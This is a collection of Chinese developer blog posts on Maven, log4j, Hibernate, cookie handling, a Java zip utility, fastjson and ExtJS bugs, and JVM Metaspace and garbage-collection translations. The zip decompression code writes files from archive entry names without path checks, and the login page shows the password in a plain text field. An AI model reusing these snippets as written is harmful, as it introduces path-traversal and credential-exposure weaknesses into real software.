(3)maven 打包发布时,发现最新的代码没有打在包里面
明明已经是最新的代码了,为什么没有打进去呢?
原因是项目的src\main\webapp\WEB-INF目录下有一个classes文件夹,里面的class等文件还是旧的,maven打包时没有自动替换它 解决方法:直接删除上述classes目录.
 
(4)终于体会了logger日志(使用日志框架如log4j)的好处
之前和同事联调项目时出现了问题,他访问我的web服务,总是返回空白,突然想到是ip限制,于是我把它的ip加到了白名单.但是还是返回空,为什么呢?
看tomcat 日志文件(使用log4j),并没有发现exception啊,真是奇怪了.
当时已经绝望了,又看了一眼日志,发现有warning级别的日志,一细看终于发现了原因,原来是他请求时content-type不对,应该是application/json,而他传的是text/xml;charset=UTF-8, 
(5)使用hibernate 自动创建表始终没有创建
使用hibernate 映射文件.hbm.xml自动创建表,但是无法创建,不知道为什么,
后来才发现hbm.xml中多了一个属性,即hbm.xml中配置一个column 实体类中没有.
 
之前的总结:
http://hw1287789687.iteye.com/blog/2034439
http://hw1287789687.iteye.com/blog/2019501
http://hw1287789687.iteye.com/blog/2005427
http://hw1287789687.iteye.com/blog/2002293
http://hw1287789687.iteye.com/blog/1997640
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
js实现登录时记住用户名, hw1287789687.iteye.com.blog.2053897, Thu, 24 Apr 2014 00:04:47 +0800

在页面中如何获取cookie值呢?
如果是JSP的话,可以通过servlet的对象request 获取cookie,可以
参考:http://hw1287789687.iteye.com/blog/2050040
如果要求登录页面是html呢?html页面中如何获取cookie呢?
直接上代码了
页面:loginInput.html
代码:
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<!-- base href="http://localhost:8080/shop_goods/" -->
<title>user login</title>
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
<meta http-equiv="description" content="This is my page">
<script language="JavaScript" src="/shop_goods/js/common_util.js" type="text/javascript"></script>
			
<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->
<style type="text/css">
.errorMessage li {
	list-style-type: none;
	margin-left: 0
}
</style>
</head>
<body>
<script type="text/javascript">
//获取cookie的值
function getCookie(cookieKey){
	var cookies = document.cookie ? document.cookie.split('; ') : [];
	for (var i = 0, l = cookies.length; i < l; i++) {
		var parts = cookies[i].split('=');
		if(parts.length>1){
			if(parts[0]==cookieKey){
				//username1=;
				return parts[1];
			}
		}
	}
	return '';
}
var username1='';
window.onload=function(){
	//cookie的key是'userEmail'
	username1=getCookie('userEmail');
	//alert("username1:"+username1);
	var issave222=com.whuang.hsj.$$one("issave");
	if(username1){
		if(username1!='' && username1!=null &&username1!=undefined){
			com.whuang.hsj.$$one("user.username").value=username1;
			issave222.checked=true;
		}else{
			issave222.checked=false;
		}
	}else{
		issave222.checked=false;
	}
}
</script>
	This is login page.
	<br>
	<a href="/shop_goods/">index</a>
	<br>
	
		<a href="/shop_goods/user/registerUser.jsp">register user</a>
	
	<font color="red"></font>
	
	<font style="font-weight: bold" color="red"> </font>
			
	
	
		<form action="/shop_goods/user/login" method="post">
			<table>
				<tbody><tr>
					<td>username:</td>
					<td><input name="user.username" id="user_username" type="text">
					</td>
				</tr>
				<tr>
					<td>password:</td>
					<td><input name="user.password" id="user_password" type="text">
					</td>
				</tr>
				<tr> <td colspan="2"> <input name="issave" value="save" type="checkbox"> 保存用户名</td></tr>
				<tr>
					<td colspan="2"><input id="" value="login" type="submit">
</td>
					
				</tr>
			</tbody></table>
			
</form></body></html>
 com.whuang.hsj.$$one等方法参见附件
 
 
    本文附件下载:
    
      common_util.zip (7.1 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java zip解压缩, hw1287789687.iteye.com.blog.2050132, Sun, 20 Apr 2014 16:41:17 +0800

java 中如何进行zip包的解压缩呢?
有两种方式:
(1)使用jdk 自带的zip工具
(2)使用apache旗下的commons-compress
我下面要讲解的zip解压缩助手使用的是apache旗下的commons-compress.
工具运行界面如下: 核心代码:
解压:
/***
	 * 解压zip
	 * 
	 * @param zipFile
	 * @param decompressLoc
	 *            :解压之后的文件所在目录
	 * @throws ArchiveException
	 * @throws IOException
	 */
	public static boolean deCompressRecursion(String zipFile,
			File decompressLoc, String charSet) throws ArchiveException,
			IOException {
		FileInputStream fin = new FileInputStream(zipFile);
		ArchiveInputStream archIns = new ArchiveStreamFactory()
				.createArchiveInputStream(ArchiveStreamFactory.ZIP, fin);
		ZipArchiveInputStream zipIn = (ZipArchiveInputStream) archIns;
		boolean isSuccess = deCompressRecursion(zipIn, decompressLoc, charSet);
		zipIn.close();
		return isSuccess;
	}
/***
	 * 递归解压缩.
	 * 
	 * @param zipIn
	 * @param decompressLoc
	 * @return
	 * @throws IOException
	 */
	private static boolean deCompressRecursion(ZipArchiveInputStream zipIn,
			File decompressLoc, String charset) throws IOException {
		ZipArchiveEntry zipEntry;
		if (ValueWidget.isNullOrEmpty(charset)) {
			charset = SystemHWUtil.CHARSET_UTF;
		}
		while (!ValueWidget.isNullOrEmpty(zipEntry = zipIn.getNextZipEntry())) {
			byte[] rawName = zipEntry.getRawName();
			String fileName = new String(rawName, charset);
			// System.out.println(fileName);
			if (zipEntry.isDirectory()) {// 是目录
				File newFolder = new File(decompressLoc, fileName);// 若子目录不存在，则创建之
				System.out.println(newFolder.getAbsolutePath());
				if (!newFolder.exists()) {
					newFolder.mkdir();
				}
				// deCompressRecursion(zipIn, decompressLoc,charset);
			} else {// 是普通文件
				File singFile = new File(decompressLoc, fileName);
				System.out.println(singFile.getAbsolutePath());
				if (singFile.exists()) {// 若解压后的文件已经存在，则直接退出
					GUIUtil23.warningDialog("File \""
							+ singFile.getAbsolutePath() + "\" does  exist.");
					return false;
				}
				/**
				 * 以下四行代码是后来添加的，为了解决父目录不存在的问题
				 */
				File fatherFolder = singFile.getParentFile();
				if (!fatherFolder.exists()) {
					fatherFolder.mkdirs();
				}
				FileUtils.writeIn2Output(zipIn, new FileOutputStream(singFile),
						true, false);
			}
		}
		return true;
	}
 
压缩:
/***
	 * 压缩文件.
	 * 
	 * @param zipFile
	 * @param folderPaths
	 * @return
	 * @throws ArchiveException
	 * @throws IOException
	 */
	public static boolean compressZipRecursion(String zipFile,
			String folderPaths) throws ArchiveException, IOException {
		FileOutputStream fou = new FileOutputStream(zipFile);
		ArchiveOutputStream archOuts = new ArchiveStreamFactory()
				.createArchiveOutputStream(ArchiveStreamFactory.ZIP, fou);
		if (archOuts instanceof ZipArchiveOutputStream) {
			ZipArchiveOutputStream zipOut = (ZipArchiveOutputStream) archOuts;
			List<ZipArchiveEntry> zipEntrys = getZipFileListRecursion(new File(
					folderPaths), null);
			for (int i = 0; i < zipEntrys.size(); i++) {
				ZipArchiveEntry zipEntry2 = zipEntrys.get(i);
				zipOut.putArchiveEntry(zipEntry2);
				File file = new File(folderPaths, zipEntry2.getName());
				if (!file.exists()) {
					return false;
				}
				if (!file.isDirectory()) {
					FileInputStream fin = new FileInputStream(file);
					// 不要关闭zipOut，关闭之前要执行closeArchiveEntry()
					FileUtils.writeIn2Output(fin, zipOut, false, true);
				}
			}
			closeZip(zipOut, true);
		}
		return true;
	}
/***
	 * 压缩之后的收尾操作.
	 * 
	 * @param zipOut
	 * @throws IOException
	 */
	private static void closeZip(ZipArchiveOutputStream zipOut,
			boolean iscloseArchiveEntry) throws IOException {
		if (iscloseArchiveEntry) {
			zipOut.closeArchiveEntry();// it is necessary
		}
		zipOut.flush();
		zipOut.finish();
		zipOut.close();
	}
 上述代码见类:com.common.util.CompressZipUtil
项目名:zip_mgmt
项目源代码见附件:zip_mgmt.zip
项目使用maven 构建
IDE:eclipse
依赖的jar包:(1)io0007-find_progess-0.0.8-SNAPSHOT.jar
(2)is_chinese
学习笔记见附件java zip压缩.zip
 
 
参考:http://m.blog.csdn.net/blog/buyaore_wo/7047343
http://www.cnblogs.com/un4sure/archive/2011/09/27/2193298.html,
http://hw1287789687.iteye.com/blog/1976309
 
    本文附件下载:
    
      zip_mgmt.zip (23.5 KB)
io0007-find_progess-0.0.8-SNAPSHOT.jar (286.9 KB)
is_chinese-0.0.1-SNAPSHOT.jar (13.2 KB)
java_zip压缩.zip (100.8 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
spring 3+ fastjson bug 记录, caoyaojun1988-163-com.iteye.com.blog.2063536, Thu, 08 May 2014 09:44:55 +0800

场景描述：
 使用fastjson的JSON.toJSONString(Domain)的时候，如果Domain中有字段是通过spring proxy出来的，在spring3以上版本会报错，spring3以下不受影响：代理代码如下：
 
        ProxyFactory proxy = new ProxyFactory(Manager);
        proxy.addAdvice(Interceptor);
        return (VO) proxy.getProxy();
   报错如下：
 
Caused by: com.alibaba.fastjson.JSONException: create asm serializer error, class interface org.springframework.aop.Advisor
        at com.alibaba.fastjson.serializer.SerializeConfig.createJavaBeanSerializer(SerializeConfig.java:88)
        at com.alibaba.fastjson.serializer.JSONSerializer.getObjectWriter(JSONSerializer.java:455)
        at com.alibaba.fastjson.serializer.JSONSerializer.getObjectWriter(JSONSerializer.java:423)
        at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:371)
        at Serializer_6.write1(Unknown Source)
        at Serializer_6.write(Unknown Source)
        at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:373)
        at Serializer_2.write1(Unknown Source)
        at Serializer_2.write(Unknown Source)
        at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:352)
        at com.alibaba.fastjson.JSON.toJSONString(JSON.java:378)
        at com.alibaba.fastjson.JSON.toJSONString(JSON.java:366)
      
Caused by: java.lang.NullPointerException
        at com.alibaba.fastjson.util.TypeUtils.isJSONTypeIgnore(TypeUtils.java:952)
        at com.alibaba.fastjson.util.TypeUtils.isJSONTypeIgnore(TypeUtils.java:963)
        at com.alibaba.fastjson.util.TypeUtils.computeGetters(TypeUtils.java:827)
 
原理：
spring3以后spring-CORE 里面包含了CGLIB，相关类由
net.sf.cglib.proxy.Factory
变为：
org.springframework.cglib.proxy.Factory
 
假设Domain里面的A这个对象，通过A.getInterface[] 可以看到
 
 spring 3： (java.lang.Class<T>[]) [interface org.springframework.aop.SpringProxy, interface org.springframework.aop.framework.Advised, interface org.springframework.cglib.proxy.Factory]
 spring 2： (java.lang.Class<T>[]) [interface org.springframework.aop.SpringProxy, interface org.springframework.aop.framework.Advised, interface net.sf.cglib.proxy.Factory]  
 
而在fastjsom：JSONSerializer的 472行（21版本）
 
       for (Class<?> item : clazz.getInterfaces()) {
                    if (item.getName().equals("net.sf.cglib.proxy.Factory")) {
                        isCglibProxy = true;
                        break;
                    } else if (item.getName().equals("javassist.util.proxy.ProxyObject")) {
                        isJavassistProxy = true;
                        break;
                    }
                }
 这里会判断失效。导致问题。
 
后续
已报告fastjson团队，目前1.1.40版本任未修复。
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
EXT JS 4 Store Filter 在下拉框中，第一次不生效, caoyaojun1988-163-com.iteye.com.blog.2041838, Mon, 07 Apr 2014 19:16:56 +0800

问题记录：
 
在extjs 4，使用combox的store的filter，但是第一次始终不起作用，第二次开始正常。
 
解决办法如下：
http://docs.sencha.com/extjs/4.0.7/#!/api/Ext.form.field.ComboBox-property-lastQuery
 
即添加：
 
    queryMode: 'local',
    triggerAction: 'all',
    lastQuery: ''
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jboss 4.5 迁移到 jboss 7 cookie 特殊字符 问题记录, caoyaojun1988-163-com.iteye.com.blog.1997987, Wed, 01 Jan 2014 16:20:07 +0800

一、背景：
 
   公司最近将jboss的版本从4.5 升级到7,之后发现从cookie中，获取不到用户的信息了。经过debug发现，保存用户信息的cookie，在request.getCookie()之后就是被截断了。本来是 key=x_l=1&x_locale=zh_CN&no_popup_today=n&user=xxx|xxx|xxx|xxx|xxx&xxx=xxx 但是获取到值是key=x_l。
 
二、相关代码以及问题解决：
 
      在jboss包里 org.apache.tomcat.util.http.Cookies  类里 有如下方法：
 
   /**
     * Given the starting position of a token, this gets the end of the token, with no separator characters in between.
     * JVK
     */
    private static final int getTokenEndPosition(byte bytes[], int off, int end, int version, boolean isName) {
        int pos = off;
        while (pos < end
               && (!CookieSupport.isHttpSeparator((char) bytes[pos]) || version == 0
                   && CookieSupport.ALLOW_HTTP_SEPARATORS_IN_V0 && bytes[pos] != '='
                   && !CookieSupport.isV0Separator((char) bytes[pos]) || !isName && bytes[pos] == '='
                                                                         && CookieSupport.ALLOW_EQUALS_IN_VALUE)) {
            pos++;
        }
        if (pos > end) return end;
        return pos;
    }
 
 当拿到x_l=1&x_locale=zh_CN&no_popup_today=n&x_user=user=xxx|xxx|xxx|xxx|xxx&xxx=xxx 这个字符串的时候，会通过上面的方法，来找到字符串最后一个可用字符的位置，然后截断。自然我们获取到key=x_l 也正式这个方法截断导致的。当遇到“=”的时候
bytes[pos] == '=' && CookieSupport.ALLOW_EQUALS_IN_VALUE 这个判断依赖与CookieSupport.ALLOW_EQUALS_IN_VALUE的值。
在CookieSupport 类中可以发现：
 
 ALLOW_EQUALS_IN_VALUE = Boolean.valueOf(System.getProperty(
                "org.apache.tomcat.util.http.ServerCookie.ALLOW_EQUALS_IN_VALUE",
                "false")).booleanValue();
 所以找到问题的答案，将 org.apache.tomcat.util.http.ServerCookie.ALLOW_EQUALS_IN_VALUE配置为true，及解决问题。
 
     但是为了之前jboss4.5没有这个问题呢？ 参见：http://thenitai.com/2013/05/02/tomcat-truncating-cookies-with-values/ 
 
三、jboss 7 cookie 解析流程：
 
四、扩展：
 
   cookie版本的问题：网上很容易找到对应资料，摘录一段：
 　　1. Cookie的兼容性问题　　Cookie的格式有2个不同的版本，第一个版本，我们称为Cookie Version 0，是最初由Netscape公司制定的，也被几乎所有的浏览器支持。而较新的版本，Cookie Version 1，则是根据RFC 2109文档制定的。为了确保兼容性，JAVA规定，前面所提到的涉及Cookie的操作都是针对旧版本的Cookie进行的。而新版本的Cookie目前还不被Javax.servlet.http.Cookie包所支持。　　2. Cookie的内容　　同样的Cookie的内容的字符限制针对不同的Cookie版本也有不同。在Cookie Version 0中，某些特殊的字符，例如：空格，方括号，圆括号，等于号（=），逗号，双引号，斜杠，问号，@符号，冒号，分号都不能作为Cookie的内容。　　虽然在Cookie Version 1规定中放宽了限制，可以使用这些字符，但是考虑到新版本的Cookie规范目前仍然没有为所有的浏览器所支持，因而为保险起见，我们应该在Cookie的内容中尽量避免使用这些字符。
 
       3、cookie version 1规范
            RFC 2109 参见：http://www.faqs.org/rfcs/rfc2109.html            关于cookie中value定义 参见：http://www.faqs.org/rfcs/rfc2068.html
       4、cookie vesion 2 规范：http://www.faqs.org/rfcs/rfc2965.html
 
   在 CookieSupport 类也可以看到定义的特殊字符：
 
 /*
        Excluding the '/' char by default violates the RFC, but 
        it looks like a lot of people put '/'
        in unquoted values: '/': ; //47 
        '\t':9 ' ':32 '\"':34 '(':40 ')':41 ',':44 ':':58 ';':59 '<':60 
        '=':61 '>':62 '?':63 '@':64 '[':91 '\\':92 ']':93 '{':123 '}':125
        */
        if (CookieSupport.FWD_SLASH_IS_SEPARATOR) {
            HTTP_SEPARATORS = new char[] { '\t', ' ', '\"', '(', ')', ',', '/', 
                    ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '{', '}' };
        } else {
            HTTP_SEPARATORS = new char[] { '\t', ' ', '\"', '(', ')', ',', 
                    ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '{', '}' };
        }
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JAVA 8 ：从永久区（PermGen）到元空间（Metaspace）, caoyaojun1988-163-com.iteye.com.blog.1969853, Mon, 04 Nov 2013 19:50:30 +0800

本文系翻译：原文地址
你注意到了吗？JDK 8早期可访问版本已经提供下载了，java 开发人员可以使用java 8 提供的新的语言和运行特性来做一些实验。其中一个特性就是完全的移除永久代（Permanent Generation (PermGen)），这从JDK 7开始Oracle就开始行动了，比如：本地化的String从JDK 7开始就被移除了永久代（Permanent Generation ）。JDK 8让它最终退役了。本文将会分享至今为至我收集的关于永久代（Permanent Generation ）的替代者：元空间（Metaspace）的信息。我也会比较在执行JAVA 程序时HotSpot 1.7 和 HotSpot 1.8 (b75)的运行行为。关于元空间（Metaspace）最后的规范、调整参数和文档将在Java 8 正式发布之后公开。 
元空间（Metaspace）：一个新的内存空间的诞生
 与 Oracle JRockit 和 IBM JVM类似，JDK 8.HotSpot JVM开始使用本地化的内存存放类的元数据，这个空间叫做元空间（Metaspace）。一 个好的消息是意味着java.lang.OutOfMemoryError: PermGen的空间问题将不复存在，并且不再需要调整和监控这个内存空间，虽然还没有那么快。当这个变化被默认执行的时候，我们会发现你任然需要担心类的元数据的内存占用率的问题，所以请记住这个新的特性并不会奇迹般的消除类和类加载器的内存泄漏。而是你需要使用一些不同的方式和学习新名词来追查这些问题。我建议你阅​​读永久带移除的总结和Jon对这个问题的意见。 总结：
永久区的情况：
这个内存空间被完全的移除 
JVM参数PermSize 和 MaxPermSize会被忽略，当前在启动时会有警告信息 
元空间（Metaspace）内存分配模型
现在大多数的类元数据分配在本地化内存中。
我们用来描述类的元数据的klasses已经被移除。 
元空间的容量
默认情况下，类元数据分配受到可用的本机内存容量的限制（容量依然取决于你使用32位JVM还是64位操作系统的虚拟内存的可用性）。 
一个新的参数 (MaxMetaspaceSize)可以使用。允许你来限制用于类元数据的本地内存。如果没有特别指定，元空间将会根据应用程序在运行时的需求动态设置大小。 
元空间的垃圾回收
如果类元数据的空间占用达到参数“MaxMetaspaceSize”设置的值，将会触发对死亡对象和类加载器的垃圾回收。 
为了限制垃圾回收的频率和延迟，适当的监控和调优元空间是非常有必要的。元空间过多的垃圾收集可能表示类，类加载器内存泄漏或对你的应用程序来说空间太小了。
java堆空间的影响 
一些各种各样的数据已经转移到Java堆空间。这意味着未来的JDK8升级后，您可能会发现Java堆空间的不断增加。
元空间监控
元空间的使用从HotSpot 1.8开始有详细的GC日志输出。 
在我们基于B75测试的时候Jstat 和JVisualVM还没有升级， 目前还是引用到老的永久代空间。现在有足够的理论，我们可以通过我们的Java程序泄漏的行为来观察我们的这个新的内存空间...
 永久代和元空间运行时对照
为了更好的理解新的元空间运行时的行为特征，我们创建一个类元数据泄露的java程序，你可以在这里下载源代码：
我们测试下面的场景： 
使用JDK 1.7运行java程序，并且为了监控和耗尽永久代内存空间，将其设置为128MB
使用JDK1.8（B75）运行java程序，并且监控新的元空间内存的冬天增长和垃圾回收。 
使用JDK1.8（B75）运行java程序，通过设置MaxMetaspaceSize 为128MB来同样耗尽元空间 .
JDK 1.7 @64-bit – PermGen depletion
java程序设置50k次的迭代 
java的堆空间为1024MB
java的永久代空间为128MB  (-XX:MaxPermSize=128m)
正如你看到的JVisualVM的报告，当加载30K+ 的类的时候，永久代被耗尽。我们也可以从程序和GC的输出文件中发现耗尽。类元数据泄漏模拟器的作者Pierre-Hugues Charbonneau在博客： http://javaeesupportpatterns.blogspot.com中描述了错误： ERROR: java.lang.OutOfMemoryError: PermGen space 。现在我们使用 HotSpot JDK 1.8 JRE.来运行程序。
 JDK 1.8 @64-bit – Metaspace dynamic re-size
Java 程序设置50k次的迭代 
Java 堆空间为1024MB 
Java 元空间为无限（默认值）  
 正如你看到的详细的GC输出，为了满足我们的Java程序不断增加的类元数据的内存占用，JVM元空间扩大从20 MB动态占用本机内存高达328 MB。我们也可以观察垃圾收集，JVM在试图摧毁任何死类或类加载器对象。自从我们的Java程序泄漏，JVM不得不扩张元空间的内存空间。
该方案可以迭代50K次，并且没有OOM事件和加载50K+类。
接下去我们来看最后的测试场景：
JDK 1.8 @64-bit – Metaspace depletion
Java 程序设置50k次的迭代
Java 堆空间为1024MB 
Java 元空间为128 MB (-XX:MaxMetaspaceSize=128m)
正如你看到的JVisualVM的报告，当加载30K+ 的类的时候，元空间被耗尽，和在JDK1.7的表现非常相近。我们也可以在程序和GC的输出日志中找到。另一个有趣的现象是，本机内存保留的占用空间是指定的最大大小的两倍之多。如果可能的话，为了避免本机内存浪费。这可能表明需要优化元空间扩张尺寸的策略，。
 现在我们可以从java程序的输出日志中找到下面的异常：
  view sourceprint?
1.Class metadata leak simulator
2.Author: Pierre-Hugues Charbonneau
3.<a href="http://javaeesupportpatterns.blogspot.com">http://javaeesupportpatterns.blogspot.com<;/a>
4.ERROR: java.lang.OutOfMemoryError: Metadata space
5.Done!
正如预期的那样，设置元空间最大尺寸为128 MB，就像我们在JDK1.7中一样没有让我们完成我们的50K迭代的计划。JVM抛出一个新的OOM错误。上述OOM事件是由JVM从元空间在捕获一个一个内存分配失败后抛出。
 #metaspace.cpp 结束语
 我希望你能欣赏这个对新的Java8元空间的早期的分析和实验 。目前观测表明，为了远离类似在我们最后测试场景中出现的频繁的元空间GC和OOM的问题，适当的监控和调优是必须的。以后的文章中可能包括性能比较，以确定这一新功能相关的潜在性能改进。请随时提供任何意见。 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java垃圾回收精华, caoyaojun1988-163-com.iteye.com.blog.1966814, Wed, 30 Oct 2013 14:24:15 +0800

本文系翻译： 原文地址：mechanical-sympathy.blogspot.com/2013/07/java-garbage-collection-distilled.html
java垃圾回收精华
串行（Serial），并行（Parallel），并发（Concurrent），CMS，G1，年轻代（Young Gen），新生代（New Gen），老生代（Old Gen），永久代（Perm Gen），伊甸区（Eden）， 年老区（Tenured）， 幸存区（Survivor Spaces），安全点(Safepoints)，和数百种JVM启动标志。当你试图调优垃圾回收器，使你的java应用能获得所需要的吞吐量和延迟，这些概念难到你了吗？如果它们使你困惑，我相信很多人也正和你一样。阅读垃圾回收的文档感觉就像是阅读飞机的帮助文档一样。每一个旋钮和仪表盘都有详细的解释。但是没有地方指导你怎么让它能飞起来。本文将试图解释在特定的工作中选择和调优垃圾回收算法的一些权衡点。
 
 我们主要关注通常使用的Oracle的Hotspot JVM 和OpenJDK的收集器。在最后我们会讨论其他商业的JVMS来说明其他的方案。
权衡点（The Tradeoffs）
俗话说：“从来没有不劳而获”。当我们得到某些事物的时候，通常不得不需要放弃另外一些事物，当谈论垃圾收集的时候，我们主要考虑三个收集器的指标：
1、吞吐量：花费在GC上的时间占整个应用程序工作的比例。通过‑XX:GCTimeRatio=99设置目标吞吐量，99表示1%的时间用于GC。
2、延迟：因为垃圾回收，而引起的响应暂停的时间。通过‑XX:MaxGCPauseMillis=<n>设置目标GC暂停的延迟。
3、内存：我们的系统使用内存来存储状态，在管理的时候它们常常需要复制和移动。在任意一个时间点系统中剩余的存活对象称之为存活集（ Live Set）。通过–Xmx<n> 设置最大堆的大小，从而调节在应用程序中可用堆的大小。
 
注：通常Hotspot并不能达到这些目标，并且即使已经大大的偏离了目标，任然会没有任何警告继续运行。
延迟的影响会穿插在整个运行过程当中。可能我们能够接受增加一些平均短的延迟，来减少最坏情况下的延迟，或则使其较不频繁。术语“实时”并不是我们认为的尽可能最低的延迟。而是在不考虑吞吐量的时候，有一个明确的短的延迟。
 
对于某些大任务的应用来说，吞吐量是最重要的指标。比如一个长期运行的批处理作业，如果偶尔暂停几秒来垃圾回收并不要紧，只要整体的工作可以尽早的完成即可。
 
而对于几乎所有其他的应用，从直面人类用户的应用程序到金融交易系统，如果出现系统在几秒甚至有时候几毫秒无响应，将导致灾难性的后果，在金融交易系统中，往往需要牺牲一些吞吐量来换取一致的延迟。我们也有可能需要应用程序限制物理内存，必须控制它占用的空间，在这种场景下，我们必须放弃延迟和吞吐量方面的性能考量。
 
权衡的通用结论如下：
  作为均摊的成本，垃圾回收在很大程度上可以通过使用更大的内存和相应的垃圾回收算法来消减成本。
  可以观察到在最坏情况下，由延迟引发的响应暂停。可以通过限制存活集（live set），保持堆的大小在小的范围来减少。
  暂停发生的频率可以通过管理堆和代的大小，并且控制应用程序的对象分配率来减少。
  长时间暂停的频率可以通过并行运行GC和应用程序来减少，但有时会影响吞吐量。
 对象生命周期
垃圾回收算法的优化通常都是期望大部分对象只有很短的生命周期，只有少部分对象有较长的生命周期。在大部分应用中，大部分对象的生命周期限制在一个明确的时间段里，小部分对象的生命周期贯穿整个JVM生命周期。在垃圾收集理论中，这种现象通常被称为“infant mortality（婴儿死亡率，大量对象生存时间很短）” 或则  “weak generational hypothesis（弱年代假设）”。例如：循环迭代内的变量大多生命周期短暂，而静态字符串则在JVM整个生命周期中都有效。
 
实验表明，分代垃圾收集器的吞吐量通常比非分代垃圾回收器有一个数量级的提升，因而几乎在所有的服务器的JVM中，通常把对象分代。我们发现新分配的对象所在区域能存活的对象是非常稀疏的。因此使用一个收集器清理这个新生代里面少数活着的对象，并且将它们拷贝到老生代里是非常有效的。Hotspot垃圾回收器使用在GC周期中幸存的次数来作为一个对象的年纪。
 
注：如果你的应用程序不断的产生大量的对象，并且存活相当长的时间，可以预见你的应用程序将会花费一段长的时间去回收垃圾，同样可以预计到你也将花费一段时间来调优Hotspot的垃圾回收器。这是由于这种情况下分代的“过滤器”不太有效。并且结果还会导致存活代的收集更频繁，时间更长。老生代是紧密的，所以老生代的收集算法的效率会更低。分代垃圾回收器往往分为两个不同回收周期：针对短时间存活对象的回收的新生代回收（Minor collections）和对年老区回收的更低频率的老年代回收（Major collections）
世界为之暂停（Stop-The-World Events）
在垃圾回收过程中的应用程序暂停被称之为“世界暂停事件（stop-the-world events）”。在实际工程中由于内存管理的需要，定期暂停正在运行的程序，对于垃圾回收器来说是必须的。根据不同的算法，不同的回收器在不同的时间，在不同的执行点上暂停应用程序（stop-the-world）。为了暂停整个应用程序，首先要暂停所有正在运行的线程。当系统在一个“安全点”的时候，垃圾回收器通过发送一个信号让线程暂停，并开始垃圾回收，“安全点”是指在程序执行中，所有的GC根对象是已知的，并且所有的堆对象的内容是一致的时间点。依赖于线程正在做的事情，它将花费一些时间达到“安全点”。“安全点”的检查通常是执行方法的返回，或则循环边界结束，但是可以进行优化，在某些时候可以更加动态的判断。比如：一个线程正在复制一个大的数组，克隆一个大的对象，或者执行一个有限次的单纯计数的循环。它可能需要几毫秒才能到达下一个“安全点”。对于低延迟的应用，到达安全点的时间（TTSP）是非常重要的。除了其他的GC标志之外，启用‑XX:+PrintGCApplicationStoppedTime 标志可以输出这个时间。
 
注：对于有大量正在运行的线程的应用程序来说，当暂停应用程序（stop-the-world）发生时，系统将会发生明显的调度压力。并在结束后恢复。因此较少的依赖暂停应用程序（stop-the-world）的算法将会更加有效。
Hotspot中的堆结构
去理解不同的收集器的方式，是探讨java堆结构如何支持分代机制的最好的方式。
 
伊甸区（Eden）的大部分对象都是刚刚被分配的。幸存区（survivor）是临时存储那些从伊甸区（Eden）里幸存下来的对象。当我们讨论新生代回收（minor collections）的时候将描述幸存区（survivor）的用途。伊甸区（Eden）和幸存区（survivor）常常统称为“年轻代（young）”或则“新生代（new）”
 
存活足够久的对象，将最终移到年老（tenured ）区里。
 
永久代也是运行时存放对象的区域，它存储像类（Classes）和静态字符串（static Strings）一样不被销毁的对象。不幸的是在许多应用程序中，在持续运行的前提下，类加载的通常有一个激进的假设：即类是不会销毁的。在java 7中的本地化的String会从永久（permgen）代移动到年老（tenured）区。并且java 8从HotSpot虚拟机中删除了“永久代（Permanent Generation），这不再本文的讨论范围里。大部分其他的商业收集器不使用一个单独的永久代，而是往往把所有长期存活的对象放到老生代里面。
 
注：虚拟空间（Virtual spaces）允许收集器调整区的大小，以满足延迟和吞吐量的要求。收集器对每一次的收集做统计，并调整相应区的大小，来达到目标。
对象的分配
为了避免竞争，每一个线程都分配一个线程本地分配缓冲区（Thread Local Allocation Buffer (TLAB)），线程在其中分配对象。使用TLABs允许对象分配的规模等于线程的数量，避免了单个内存资源的竞争问题。凭借TLAB对象分配是一个廉价的操作。它简单的为对象的大小分配一个指针，大部分平台上大约需要10个指令。java堆内存的分配比C在运行时使用malloc 函数分配内存更加廉价。 
 
注：鉴于个别对象分配是很廉价的，小集合分配的速率与对象分配的速度是成正比的。
 
当一个TLAB被耗尽率，线程可以简单从伊甸区（Eden）请求一个新的。当伊甸区（Eden）用完后，开始一次新生代回收（minor collection）。
 
 大对象(-XX:PretenureSizeThreshold=<n>)在年轻代（young generation）的分配可能失败，因此必须分配在老年代（old generation），比如：大数组。
 
如果阈值的设置低于TLAB大小，适合在TLAB的对象将不会创建在老生代（old generation）。新的G1收集器在处理大对象的时候有所不同，在后面单独的部分讨论。
 新生代的回收（Minor Collections）
当伊甸区（Eden）填满之后，触发一次新生代回收（Minor Collections）。通过将所有在新生代里存活的对象适当的复制到幸存区（survivor space）和年老区（tenured space）来完成。复制到年老区（tenured space）通常称为晋升（promotion）或则老年化（tenuring）。晋升针对那些足够老的对象(– XX:MaxTenuringThreshold=<n>)，或者幸存空间（survivor space）溢出。
 
存活的对象是指那些应用程序可以访问到的对象，不能访问的其他任何对象，可以被认为是死的。在新生代的收集（minor collection）中，存活对象的复制是通过从GC根对象（GC Roots）开始，反复地复制任何从GC根对象可到达的对象到幸存区（survivor space）来完成的。
 
GC根对象（GC Roots）通常包括应用程序、JVM内部的静态字段和线程堆栈帧的引用，所有的这些有效的引用，构成了应用程序可到达对象的图谱。
 
